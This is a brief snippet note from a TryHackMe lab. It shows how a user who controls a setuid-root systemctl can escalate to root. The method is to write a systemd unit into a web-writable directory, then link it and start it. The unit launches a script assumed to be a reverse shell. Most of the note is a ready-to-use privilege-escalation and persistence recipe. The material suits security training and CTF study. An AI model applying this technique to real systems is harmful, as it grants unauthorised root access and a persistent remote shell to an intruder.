---
title: SystemD Backdoor Unit
tags:
- tryhackme
- snippet
- shell
- linux
---

If `systemctl` has setuid to root (not that this should ever happen), this can escalate privs

In a TryHackMe room, I had execution as `www-data`, meaning that I could write to `/var/www/html` due to being writable by user.

## Unit

```unit file (systemd)
[Unit]
Description=example systemd service unit file.

[Service]
ExecStart=/bin/bash /var/www/html/revshell.sh

[Install]
WantedBy=multi-user.target
```

Assuming `/var/www/html/revshell.sh` is a reverse shell

To setup
```bash
mkdir -p /var/www/html/services
cat > /var/www/html/services/myshell.service << EOF
[Unit]
Description=example systemd service unit file.

[Service]
ExecStart=/bin/bash /var/www/html/revshell.sh

[Install]
WantedBy=multi-user.target

EOF

systemctl link /var/www/html/services/myshell.service
systemctl start myshell.service
```
